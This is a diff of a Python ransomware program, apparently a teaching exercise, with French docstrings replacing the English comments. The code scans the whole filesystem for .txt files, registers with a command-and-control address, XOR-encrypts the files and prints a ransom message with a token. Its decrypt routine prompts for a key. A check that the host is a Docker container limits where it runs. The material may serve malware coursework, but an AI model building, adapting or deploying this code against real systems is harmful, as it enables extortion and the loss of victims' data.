@@ -30,78 +30,97 @@ DECRYPT_MESSAGE = """
 |_|   |_|_|\___||___/ |____/ \___|\___|_|   \__, | .__/ \__\___|\__,_|
                                             |___/|_| 
 """
+
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
     
-    def check_hostname_is_docker(self)->None:
-        # At first, we check if we are in a docker
-        # to prevent running this program outside of container
+    def check_hostname_is_docker(self) -> None:
+        """
+        Vérifie si le programme s'exécute bien dans un environnement Docker.
+        Si ce n'est pas le cas, le programme s'arrête.
+        """
         hostname = socket.gethostname()
-        result = re.match("[0-9a-f]{6,6}", hostname)
-        if result is None:
-            print(f"You must run the malware in docker ({hostname}) !")
+        if not re.match("[0-9a-f]{6,6}", hostname):
+            print(f"Erreur : Ce programme doit être exécuté dans un conteneur Docker ({hostname}) !")
             sys.exit(1)
 
-    def get_files(self, filter:str)->list:
-        path = Path("/") 
-        list_file = [file for file in path.rglob(filter)]
-        list_file_str = [str(txt) for txt in list_file]
-        return list_file_str
+    def get_files(self, file_filter: str) -> list:
+        """
+        Recherche tous les fichiers correspondant au filtre donné.
+        Retourne une liste des chemins absolus.
+        """
+        base_path = Path("/")
+        return [str(f) for f in base_path.rglob(file_filter)]
 
     def encrypt(self):
-        # Main function for encrypting (see PDF)
-        # Find all txt files
+        """
+        Fonction principale pour chiffrer les fichiers :
+        - Trouver tous les fichiers .txt
+        - Générer la clé et le token
+        - Chiffrer les fichiers
+        - Afficher le message de rançon
+        """
         txt_files = self.get_files("*.txt")
 
-        #Create the Key Manager
+        # Création du gestionnaire de secrets
         secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
         secret_manager.setup()
 
-        # Encrypt the files
+        # Chiffrement des fichiers trouvés
         secret_manager.xor_files(txt_files)
 
+        # Récupération et affichage du token
         token = secret_manager.get_hex_token()
-        print(ENCRYPT_MESSAGE.format(token.hex()))
+        print(ENCRYPT_MESSAGE.format(token=token))
 
     def decrypt(self):
-        # Create an instance of SecretManager
+        """
+        Fonction principale pour déchiffrer les fichiers :
+        - Demande la clé à l'utilisateur
+        - Vérifie si la clé est correcte
+        - Déchiffre les fichiers
+        - Supprime les fichiers temporaires
+        """
+        # Initialisation du gestionnaire de secrets
         secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
 
-        # Load the local cryptographic elements
+        # Chargement des éléments cryptographiques locaux
         secret_manager.load()
 
-        # List all the .txt files
+        # Recherche des fichiers chiffrés
         txt_files = self.get_files("*.txt")
 
         while True:
             try:
-                # Ask for the decryption key
-                _key = input("Enter the key to decrypt your files: ")
+                # Demande à l'utilisateur d'entrer la clé de déchiffrement
+                entered_key = input("Entrez la clé pour déchiffrer vos fichiers : ")
 
-                # Set the key
-                secret_manager.set_key(_key)
+                # Vérification et application de la clé
+                secret_manager.set_key(entered_key)
 
-                # Decrypt the files using the xorfiles() method of SecretManager
-                secret_manager.xorfiles(txt_files)
+                # Déchiffrement des fichiers
+                secret_manager.xor_files(txt_files)
 
-                # Clean up the local cryptographic files
+                # Nettoyage des traces locales
                 secret_manager.clean()
 
-                # Inform the user that the decryption was successful
+                # Confirmation de la réussite
                 print(DECRYPT_MESSAGE)
 
-                # Exit the ransomware
+                # Sortie du programme
                 break
             except ValueError as error:
-                # Inform the user that the key is invalid
-                print(f"Error: {error}. Invalid key. Please try again.")
+                print(f"Erreur : {error}. Clé invalide. Veuillez réessayer.")
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
+
     if len(sys.argv) < 2:
         ransomware = Ransomware()
         ransomware.encrypt()
     elif sys.argv[1] == "--decrypt":
         ransomware = Ransomware()
         ransomware.decrypt()
+
+
